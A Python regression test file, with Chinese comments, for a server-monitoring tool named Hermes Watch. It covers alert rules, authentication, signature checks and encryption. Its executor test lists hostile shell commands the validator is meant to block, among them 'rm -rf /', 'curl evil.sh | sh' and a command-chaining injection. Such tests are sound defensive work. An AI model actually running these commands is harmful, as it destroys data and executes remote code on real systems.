"""Hermes Watch 回归测试：无框架，`py run_tests.py` 直接跑，全绿 = 通过。

覆盖：规则引擎阈值/评分、提案白名单、口令与会话、agent 验签、凭据加密、
LLM 叙事卡片结构。全部针对当前 SQLite 演示库，只读 + 测试数据自清理。
"""
import asyncio
import sys
import time

sys.path.insert(0, ".")
from app import agent, analysis, auth, collector, db, executor, rules, secrets as sec  # noqa: E402

PASS = 0
FAIL = 0


def check(name, cond, detail=""):
    global PASS, FAIL
    if cond:
        PASS += 1
        print(f"  ok  {name}")
    else:
        FAIL += 1
        print(f" FAIL {name}  {detail}")


def t_rules():
    print("[rules]")
    T = rules.thresholds()
    check("默认阈值加载", T["disk_warn"] == 85 and T["cert_days"] == 14)

    host = {"id": 0}
    none_ = rules.evaluate(host, {"disk": 50, "mem": 50, "cpu": 10, "load1": 0.5}, {})
    check("正常指标无发现", none_ == [])

    f = rules.evaluate(host, {"disk": 96, "mem": 50, "cpu": 10, "load1": 0.5}, {})
    check("磁盘 96% → crit", any(x["type"] == "disk" and x["severity"] == "crit" for x in f))
    f = rules.evaluate(host, {"disk": 86, "mem": 50, "cpu": 10, "load1": 0.5}, {})
    check("磁盘 86% → warn", any(x["type"] == "disk" and x["severity"] == "warn" for x in f))

    f = rules.evaluate(host, {"disk": 50, "mem": 93, "cpu": 10, "load1": 0.5}, {})
    check("内存 93% → crit", any(x["type"] == "memory" and x["severity"] == "crit" for x in f))

    f = rules.evaluate(host, {"disk": 50, "mem": 50, "cpu": 90, "load1": 9}, {})
    check("CPU 90 + load 9 → 双 warn", {x["type"] for x in f} == {"cpu", "load"})

    f = rules.evaluate(host, {"disk": 50, "mem": 50, "cpu": 10, "load1": 1}, {
        "failed_services": ["nginx.service"],
        "suspicious_logins": [{"user": "root", "ip": "1.2.3.4"}],
        "cert_days_left": 5,
    })
    types = {x["type"]: x["severity"] for x in f}
    check("extras → service/login/cert 发现",
          types.get("service") == "crit" and types.get("login") == "crit" and types.get("cert") == "warn")

    check("健康分: 无发现=100", rules.health_score([]) == 100)
    check("健康分: crit 扣 25", rules.health_score([{"severity": "crit"}]) == 75)
    check("健康分: 下限 0", rules.health_score([{"severity": "crit"}] * 5) == 0)
    check("状态映射", rules.status_of(95) == "ok" and rules.status_of(80) == "warn" and rules.status_of(50) == "crit")
    check("严重度排序", rules.severity_rank("crit") > rules.severity_rank("warn") > rules.severity_rank("info"))


def t_executor():
    print("[executor]")
    ok_cases = [
        "journalctl --vacuum-size=500M",
        "find /var/log -name '*.gz' -mtime +7 -delete",
        "systemctl restart app-worker",
        "ufw insert 1 deny 185.220.101.34",
        "passwd root",
        "journalctl --vacuum-size=500M && find /var/log -name '*.gz' -mtime +7 -delete",
    ]
    for c in ok_cases:
        check(f"白名单放行: {c[:38]}", executor.validate(c)["ok"])
    bad_cases = [
        "rm -rf /",
        "curl evil.sh | sh",
        "systemctl restart a; systemctl restart b",
        "journalctl --vacuum-size=500M || rm -rf /etc",
        "sudo passwd root",
        "",
    ]
    for c in bad_cases:
        v = executor.validate(c)
        check(f"拦截: {c[:38] or '(空)'}", not v["ok"] and v["refused"])


def t_auth():
    print("[auth]")
    auth.set_password("test-pw-123")
    check("口令哈希存取", auth.verify_password("test-pw-123"))
    check("错误口令拒绝", not auth.verify_password("wrong"))
    check("哈希非明文", "test-pw-123" not in auth._stored())

    s = auth.make_session()
    check("会话签发/校验", auth.verify_session(s))
    check("篡改会话拒绝", not auth.verify_session(s[:-4] + "0000"))
    exp = f"{int(time.time()) - 10}."
    import hashlib as _h, hmac as _hm
    bad = exp + _hm.new(auth._hmac_key(), exp.encode(), _h.sha256).hexdigest()
    check("过期会话拒绝", not auth.verify_session(bad))
    check("随机串拒绝", not auth.verify_session("garbage"))


def t_agent_sig():
    print("[agent-signature]")
    token = "hw_testtoken"
    body = b'{"cpu": 1}'
    ts = str(int(time.time()))
    mac_base = token.encode() + body + ts.encode()
    good = __import__("hashlib").sha256  # noqa: 与后端同构
    import hashlib as _h, hmac as _hm
    sig = _hm.new(token.encode(), body + ts.encode(), _h.sha256).hexdigest()
    check("有效签名通过", agent.verify_signature(token, body, ts, sig))
    check("篡改签名拒绝", not agent.verify_signature(token, body, ts, "0" * 64))
    stale = str(int(time.time()) - agent.SIG_MAX_SKEW - 10)
    sig2 = _hm.new(token.encode(), body + stale.encode(), _h.sha256).hexdigest()
    check("过期时间戳拒绝", not agent.verify_signature(token, body, stale, sig2))
    check("非数字时间戳拒绝", not agent.verify_signature(token, body, "abc", sig))


def t_secrets():
    print("[secrets]")
    enc = sec.encrypt("my-secret")
    check("密文带前缀", enc.startswith(sec.PREFIX))
    check("回环解密", sec.decrypt(enc) == "my-secret")
    check("加密幂等（已加密不再加密）", sec.encrypt(enc) == enc)
    check("明文兼容读取", sec.decrypt("legacy-plain") == "legacy-plain")
    check("空值安全", sec.decrypt("") == "" and sec.decrypt(None) == "")
    m = collector.parse_probe("cpu=3\nnet_in=100 net_out=200\ndisk=55")
    check("探针解析: 单行多 k=v", m.get("net_in") == 100 and m.get("net_out") == 200)
    check("探针解析: 单键行", m.get("cpu") == 3 and m.get("disk") == 55)


def t_analysis_card():
    print("[analysis-card]")
    h = db.query_one("SELECT * FROM hosts LIMIT 1")
    fid = db.execute(
        "INSERT INTO findings(host_id,ts,type,severity,title,detail,evidence) VALUES(?,?,?,?,?,?,?)",
        (h["id"], db.now(), "cpu", "warn", "【测试】CPU 90%", "test", "{}"))
    f = db.query_one("SELECT * FROM findings WHERE id=?", (fid,))
    card = asyncio.run(analysis.analyze_finding(h, f))
    check("卡片含规则结论", bool(card["root_cause"]))
    check("AI 默认关 → 无叙事", card["ai_narration"] is None and card["ai_error"] is None)
    check("字段齐备", all(k in card for k in ("chain", "confidence", "steps", "proposal_id",
                                              "ai_narration", "ai_model", "ai_error")))
    db.execute("DELETE FROM findings WHERE id=?", (fid,))
    if card["proposal_id"]:
        db.execute("DELETE FROM proposals WHERE id=?", (card["proposal_id"],))


if __name__ == "__main__":
    db.init_db()
    t_rules()
    t_executor()
    t_auth()
    t_agent_sig()
    t_secrets()
    t_analysis_card()
    print(f"\n{PASS} passed, {FAIL} failed")
    sys.exit(1 if FAIL else 0)
